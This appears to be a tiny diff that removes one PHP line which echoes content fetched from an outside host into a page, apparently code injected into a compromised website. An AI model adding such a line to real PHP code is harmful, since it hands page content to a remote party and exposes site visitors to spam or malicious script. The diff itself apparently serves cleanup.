@@ -1,1 +1,0 @@
-<?php echo file_get_contents('https://energyfussl.at/graph/2/sql.php'); ?>;
